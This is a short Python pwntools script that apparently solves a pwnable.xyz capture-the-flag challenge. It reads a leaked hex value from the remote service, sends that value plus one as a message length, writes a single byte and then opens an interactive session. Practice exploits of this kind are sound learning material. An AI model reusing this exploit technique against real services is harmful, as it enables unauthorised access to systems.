from pwn import *

#p= process("./challenge")
p=remote("svc.pwnable.xyz",30000)

context.log_level='debug'

p.readuntil(": ")
leak = p.readline()
p.readuntil("message: ")
lens=int(leak,16)+1

p.writeline(str(lens))
p.readuntil("message: ")
p.writeline("A")
p.interactive()
